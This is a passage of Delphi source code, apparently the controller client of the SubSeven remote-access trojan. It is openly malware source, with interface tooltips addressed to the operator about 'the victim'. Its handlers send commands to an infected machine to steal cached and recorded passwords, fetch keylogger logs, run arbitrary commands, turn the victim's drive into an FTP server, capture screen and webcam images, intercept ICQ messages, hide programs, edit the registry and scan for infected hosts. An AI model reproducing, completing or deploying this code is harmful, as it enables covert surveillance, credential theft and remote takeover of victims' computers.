procedure TForm1.portMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='this is the port of the server. the default is 1243.';
end;

procedure TForm1.Button53Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 transferand:=true;
  ClientSocket.Socket.SendText('GPW');
  Status.Caption:='trying to get the passwords...';
{  pass.name.Items.Clear;
  pass.name.items.Add('loading... please wait...');
  pass.show;}
 end else Status.Caption:=NotConnected;
{ pass.show;}
end;

procedure TForm1.Button54Click(Sender: TObject);
begin
 if Conectat then begin
  ClientSocket.Socket.SendText('CPL');
  Status.Caption:='trying to clear the password list...';
  pass.name.clear;
  pass.box.clear;
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button55Click(Sender: TObject);
begin
 portscan.host1.text:=edit1.text;
 portscan.host2.text:=edit1.text;
 portscan.show;
end;

procedure TForm1.Button56MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='change the port that the server will use. if everything''s fine, you''ll be disconnected from the server.';
end;

procedure TForm1.Button55MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='scan for ip''s with the Sub7 server installed. the scanner is _only_ for ips infected with Sub7';
end;

procedure TForm1.Button53MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='read the list of passwords recorded on the victim''s computer.restart the victim''s computer before using it.';
end;

procedure TForm1.Button54MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='clear the list of passwords recorded on the victim''s computer';
end;

procedure TForm1.Button57Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 transferand:=true;
  ClientSocket.Socket.SendText('GOK');
  Status.Caption:='trying to get the list of keys pressed while offline...';
{  keylogunit.Memo1.clear;
  keylogunit.memo1.Lines.add('loading... please wait...');
  keylogunit.show;}
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button57MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='get a list of all the keys pressed by the victim since a reboot.';
end;

procedure TForm1.Button56Click(Sender: TObject);
var str:String;
begin
 if Conectat then begin
  if InputQuery('enter new port', 'port: ', Str) then
  begin
   ClientSocket.Socket.SendText('CPT'+str);
   Status.Caption:='changing port...';
   port.text:=str;
  end;
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button58Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
 ftpserver.host.text:=KeepConnectedIP;
 if ftpactive then
  begin
   ftpserver.labelactive.caption:='active';
   ftpserver.button2.enabled:=true;
  end else begin
   ftpserver.labelactive.caption:='not active';
   ftpserver.Button2.enabled:=false;
  end;
 ftpserver.show;
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.DisableFTPServer;
begin
 Status.Caption:='trying to disable the FTP server...';
 ClientSocket.Socket.SendText('FTPdisable'#13#10);
 ftpactive:=false;
end;

procedure TForm1.EnableFTPServer;
begin
 if ftpactive then DisableFTPServer;
 Status.Caption:='trying to enable the FTP server...';
 ClientSocket.Socket.SendText('FTPenable!'+parola+'@@@'+IntToStr(portu)+':::'+IntToStr(clienti));
 ftpactive:=true;
end;

procedure TForm1.Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='open up a window which allows you to customize the message you want to send.[icon/caption/text/buttons]';
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
  Status.Caption:='message manager';
  messagemanager.show;
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button58MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='allow you to transform the victim''s hard drive in a ftp server [just like serv-u, only you have more access]';
end;

procedure TForm1.stopbutClick(Sender: TObject);
begin
 if Conectat then begin
   ClientSocket.Socket.SendText('CANCEL');
   Status.Caption:='stopping...';
   transfering:=false;
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button59Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
 ClientSocket.Socket.SendText('SWN'+IntToStr(ListBox2.ItemIndex+1));
 with ListBox2 do
  Status.Caption:='trying to show window: <'+Items[ItemIndex]+'>...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
 ClientSocket.Socket.SendText('HWN'+IntToStr(ListBox2.ItemIndex+1));
 with ListBox2 do
  Status.Caption:='trying to hide window: <'+Items[ItemIndex]+'>...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button60Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
 SendKeyForm.Show;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button60MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
info.caption:=#13#10'send keystrokes to the specified application.';
end;

function myip : string;
type
    TaPInAddr = array [0..10] of PInAddr;
    PaPInAddr = ^TaPInAddr;
var
    phe  : PHostEnt;
    pptr : PaPInAddr;
    Buffer2 : array [0..63] of char;
    I    : Integer;
    GInitData      : TWSADATA;
begin
    WSAStartup($101, GInitData);
    Result := '';
    GetHostName(Buffer2, SizeOf(Buffer));
    phe :=GetHostByName(buffer2);
    if phe = nil then Exit;
    pptr := PaPInAddr(Phe^.h_addr_list);
    I := 0;
    while pptr^[I] <> nil do begin
      result:=StrPas(inet_ntoa(pptr^[I]^));
      Inc(I);
    end;
    WSACleanup;
end;
procedure TForm1.Button32Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 ClientSocket.Socket.SendText('PSS');
 Status.Caption:='trying to read the passwords...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button66Click(Sender: TObject);
var sclicked,fisier:String;
begin
 if Conectat then begin
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  if (not Este(sclicked,'BMP','JPG')) and (not Este(sclicked,'JPEG','GIF')) and (not Este(sclicked,'WMF','ICO')) and (not Este(sclicked,'EMF','EMF')) then
   begin ShowMessage('the file has to be BMP,JPG,GIF,ICO,EMF or WMF');exit;end;
  fisier:=Path.Caption+'\'+sclicked;
  ClientSocket.Socket.SendText('FMZ'+fisier);
  Status.Caption:='trying to show picture...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button67Click(Sender: TObject);
begin
 if Conectat then begin
  flipForm.showmodal;
  case flipform.tag of
   0:exit;
   1:ClientSocket.Socket.SendText('FLP10');
   2:ClientSocket.Socket.SendText('FLP01');
   3:ClientSocket.Socket.SendText('FLP11');
  end;
  Status.Caption:='trying to flip the victim''s screen...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button67MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='flip the victim''s desktop horizontally or vertically. the victim can restore the desktop with a double click';
end;

procedure TForm1.FullCapture;
var qual:string;
begin
if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 transferand:=true;
 qual:=ReadIni('Options','ShotQuality');
 if length(qual)=1 then qual:='00'+qual;
 if length(qual)=2 then qual:='0'+qual;
 ClientSocket.Socket.SendText('CSS'+qual);
 Status.Caption:='capturing...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button73Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.4') then exit;
  regform.showmodal;
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button73MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='registry editor allows you to view/erase/create new registry direcories or keys';
end;

procedure TForm1.Button74MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:=#13#10'bring the selected window to front.';
end;

procedure TForm1.Button74Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('FCW'+IntToStr(ListBox2.ItemIndex+1));
 with ListBox2 do
  Status.Caption:='trying to focus <'+Items[ItemIndex]+'>...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button75Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.4') then exit;
 findform.showmodal;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button75MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='find files on the victim''s computer. for example: [*.zip]=all zip files [smdata.dat]=cuteftp address book';
end;

procedure TForm1.Shape1DragDrop(Sender, Source: TObject; X, Y: Integer);
begin
 AboutBox.About.Enabled:=True;
 Form1.Enabled:=False;
 AboutBox.About.Show;
end;

procedure TForm1.Label7Click(Sender: TObject);
begin
 AboutBox.About.Enabled:=True;
 Form1.Enabled:=False;
 AboutBox.About.Show;
end;

procedure TForm1.CoolForm1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crDefault;
 info.caption:=#13#10'click _and_ drag to move Sub7';
end;

procedure TForm1.Label7MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 info.Caption:=#13#10+'about SubSeven';
end;

procedure TForm1.Label14MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 info.caption:='local options [change colors, server options, save to folder, image quality, etc.]';
end;

procedure TForm1.Label14Click(Sender: TObject);
begin
 OptionsForm.Show;
end;

procedure TForm1.Label15Click(Sender: TObject);
begin
 ClientSocket.Active:=False;
 SaveINI('IP Addresses','Current',IntToStr(CurrentHost));
 SaveINI('IP Addresses','CurrentHost',Edit1.Text);
 SaveINI('IP Addresses','CurrentPort',port.text);
 Application.Terminate;
 Halt(0);
end;

procedure TForm1.Label15MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 info.caption:=#13#10'close the connection and exit SubSeven';
end;

procedure TForm1.Label16MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 info.Caption:=#13#10+'about SubSeven';
end;

procedure TForm1.Label16Click(Sender: TObject);
begin
 AboutBox.About.Enabled:=True;
 Form1.Enabled:=False;
 AboutBox.About.Show;
end;

procedure TForm1.Label17Click(Sender: TObject);
begin
 if height>200 then height:=115
  else height:=461;
end;

procedure TForm1.Label17MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 info.caption:=#13#10'contract or exapand sub7';
end;

procedure TForm1.Label18MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 info.caption:=#13#10'show or hide the fun manager';
end;

procedure TForm1.Label18Click(Sender: TObject);
begin
 if form3.visible then form3.hide else form3.show;
end;

procedure TForm1.Label19Click(Sender: TObject);
begin
 {application.minimize;}
 form1.hide;
 rxtrayicon1.active:=true;
end;

procedure TForm1.Label19MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 info.caption:=#13#10'minimize SubSeven';
end;

procedure TForm1.RxTrayIcon1Click(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 rxtrayicon1.active:=false;
 form1.show;
end;

procedure TForm1.RxTrayIcon1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
 rxtrayicon1.hint:=Form1.Caption;
end;

procedure TForm1.Button66MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='pops up the specified image on the victim''s screen. he or she can get rid of it by double clicking on it.';
end;

procedure TForm1.Button32MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='see the passwords saved in the UserName.PWL file. it contains all the cached passwords on the system';
end;

procedure TForm1.openSub71Click(Sender: TObject);
begin
 rxtrayicon1.active:=false;
 form1.show;
end;

procedure TForm1.aboutSub71Click(Sender: TObject);
begin
 AboutBox.About.Enabled:=True;
 Form1.Enabled:=False;
 AboutBox.About.Show;
end;

procedure TForm1.quit1Click(Sender: TObject);
begin
 form1.close;
 halt(0);
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.6') then exit;
 printForm.Show;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.keyhookChange(Sender: TObject);
begin
 keyhook.SelStart:=length(keyhook.lines.text);
end;

procedure TForm1.Button5MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='enable/disable e-mail notify. just like icq-notify, only it send emails instead of msgs on icq';
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.6') then exit;
 EMailForm.Tag:=1;
 EMailForm.Caption:='auto-notify by email';
 EMailForm.Label1.Caption:='notify to e-mail: [this is where the ip is sent]';
 EMailForm.Label2.Caption:='SMTP or POP server: [if you don''t know, don''t use it]';
 EMailForm.Label3.Caption:='user id: [used with the email server]';
 EMailForm.Edit1.Text:='subseven@flashmail.com';
 EMailForm.Edit2.Text:='jer1.co.il';
 EMailForm.Edit3.Text:='aaa';
 EMailForm.Show;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button6MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='allows you to manually type in a command, like "copy a:\*.* c:\whatever"';
end;

procedure TForm1.Button6Click(Sender: TObject);
var getstr:string;
begin
 if Conectat then begin
  If InputQuery('manual command', 'command: ', GetStr) then
   begin
    ClientSocket.Socket.SendText('COM'+GetStr);
    Status.Caption:='executing command...';
   end;
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.keysockRead(Sender: TObject; Socket: TCustomWinSocket);
var loop:integer;
    s:string;
begin
s:=Socket.ReceiveText;
loop:=0;
repeat
inc(loop);
if s[loop]=';' then begin
  if (s[loop+1]<>'ô') and (s[loop+1]<>'ö') and (s[loop+1]<>'ò') and (s[loop+1]<>'û') then
   begin
    SendMessage(KeyHook.Handle, WM_CHAR, Byte(s[loop+1]), 0);
    SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, Byte(s[loop+1]), 0);
   end
  else if s[loop+1]='ô' then
  begin
   SendMessage(KeyHook.Handle, WM_CHAR, Byte(' '), 0);
   SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, Byte(' '), 0);
  end
  else if s[loop+1]='ö' then
  begin
   SendMessage(KeyHook.Handle, WM_CHAR, VK_RETURN, 0);
   SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, VK_RETURN, 0);
  end
  else if s[loop+1]='ò' then
  begin
   SendMessage(KeyHook.Handle, WM_CHAR, Byte(#8), 0);
   SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, Byte(#8), 0);
  end
  else if s[loop+1]='û' then
  begin
   SendMessage(KeyHook.Handle, WM_CHAR, VK_TAB, 0);
   SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, VK_TAB, 0);
  end;
   s:=copy(s,1,loop-1)+copy(s,loop+2,length(s)-loop);
  dec(loop);
 end;
until loop>=length(s);

if length(s)<2 then exit;
end;

procedure TForm1.keysockError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
{trap it}
end;

procedure TForm1.Button59MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='shows the program [if it''s hidden]';
end;

procedure TForm1.Button4MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='hides completely the specified application. from ctrl+alt+del and from the screen';
end;

procedure TForm1.SpeedButton1Click(Sender: TObject);
begin
 if PopKeyHook.Visible then
  PopKeyHook.Hide
 else
  PopKeyHook.Show;
end;

procedure TForm1.SpeedButton1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
 Cursor:=crHandPoint;
 info.caption:='open the keylogger in a small resizeable window.';
end;

procedure TForm1.ChatSockDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 if (VictimChat.Visible) or (ClientChat.Visible) then
  begin
{   ShowMessage('connection lost.');}
   ClientChat.Hide;
   VictimChat.Hide;
   try Form1.ChatSock.Active:=False;except end;
  end;
end;

procedure TForm1.ChatSockError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
 if (VictimChat.Visible) or (ClientChat.Visible) then
  begin
   {ShowMessage('connection lost.');}
   ClientChat.Hide;
   VictimChat.Hide;
   try Form1.ChatSock.Active:=False;except end;
  end;
end;

procedure TForm1.ChatSockRead(Sender: TObject; Socket: TCustomWinSocket);
var gets,cods,txts:String;
begin
 gets:=Socket.ReceiveText;
 cods:=copy(gets,1,3);
 txts:=copy(gets,4,length(gets));
 if ((cods='RCC') and (not ClientChat.Visible)) then
  ClientChat.ShowIT;
 if ((cods='RVC') and (not VictimChat.Visible)) then
  begin UseMySettings:=False;VictimChat.ShowIT;end;
 if ((cods='MFV') and (VictimChat.Visible)) then
  VictimChat.AddToMyMemo(txts);
 if (cods='MFC') then
  ClientChat.Memo1.Lines.Add(txts);
 if ((cods='CVC') and (VictimChat.Visible)) then
  VictimChat.Hide;
 if (cods='CCC') then
  ClientChat.Hide;
end;

function TForm1.SendSettings:string;
var rs,t,len:string;
begin
 rs:='';
 t:=Form1.ReadINI('Options','VictimChatSize');
 if length(t)=1 then t:='00'+t
  else if length(t)=2 then t:='0'+t;
 rs:=rs+t;
 t:=Form1.ReadINI('Options','VictimFontSize');
 if length(t)=1 then t:='0'+t;
 rs:=rs+t;
 t:=Form1.ReadINI('Options','ClientFontSize');
 if length(t)=1 then t:='0'+t;
 rs:=rs+t;
 t:=Form1.ReadINI('Options','VictimChatColor');
 if length(t)<10 then len:='0'+IntToStr(length(t))
  else len:=IntToStr(length(t));
 rs:=rs+len+t;
 t:=Form1.ReadINI('Options','ClientChatColor');
 rs:=rs+t;
 result:=rs;
end;

procedure TForm1.SendMousePos(x,y:Integer);
const
  NumEvents : Word = 0;
begin
  Inc(NumEvents);
  if NumEvents = 2 then begin
    Status.Caption:='movin'' the mouse to: '+IntToStr(X)+','+IntToStr(Y);
    try Form1.MouseMsg.PostIt('x'+IntToStr(X)+'y'+IntToStr(Y)+';');
    except end;
    {ClientSocket.Socket.SendText('MMT'+IntToStr(X)+';'+IntToStr(Y)+';');}
    NumEvents := 0;
  end;
end;

{var getstr:string;
begin
 if Conectat then begin
  If InputQuery('manual command', 'command: ', GetStr) then
   begin
    ClientSocket.Socket.SendText('COM'+GetStr);
    Status.Caption:='executing command...';
   end;
 end else Status.Caption:=NotConnected;
end;}

procedure TForm1.Button7MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:=' '#13#10'print the specified file on the victim''s computer [had to be TXT or RTF]';
end;

procedure TForm1.Button7Click(Sender: TObject);
var sclicked,fisier:string;
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.8') then exit;
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  if (not Este(sclicked,'TXT','RTF')) then
   begin ShowMessage('you have to pick a TXT or RTF file.');exit;end;
  fisier:=Path.Caption+'\'+sclicked;
  ClientSocket.Socket.SendText('PTF'+fisier);
  Status.Caption:='printing file...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crDefault;
end;

procedure TForm1.Label6MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Status.Caption:='minimize Sub7 to tray';
 Cursor:=crHandPoint;
end;

procedure TForm1.Label10MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Status.Caption:='about Sub7';
 Cursor:=crHandPoint;
end;

procedure TForm1.Button12MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='capture a screenshot on the victim''s webcam [if he/she HAS one!]';
end;

procedure TForm1.Button12Click(Sender: TObject);
begin
{if Conectat then begin
{ if NotPassedVersionCheck('1.8') then exit;
 Transferand:=True;
 ClientSocket.Socket.SendText('WCC');
 Status.Caption:='trying to capture webcam screenshot...';}
 WebCamForm.Show;
{end else Status.Caption:=NotConnected;}
end;

procedure TForm1.ICQSpyButtonClick(Sender: TObject);
begin
 ICQSpyForm.Show;
end;

procedure TForm1.Label4Click(Sender: TObject);
begin
 CheckBox1.Checked:=not CheckBox1.Checked;
end;
procedure TForm1.Button3MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='type in text to be printed on the victim''s printer. [try: "i know what you did last summer" :)]';
end;

procedure TForm1.StopItTimer(Sender: TObject);
begin
 ClientSocket.ClientType:=ctNonBlocking;
 Status.Caption:='tranfer stopped.';
 StopIt.Enabled:=False;
end;


procedure TForm1.ICQSpyButtonMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
 info.caption:='intercept ICQ messages, pagers and URLs that the victim is receiving on icq.';
end;

end.
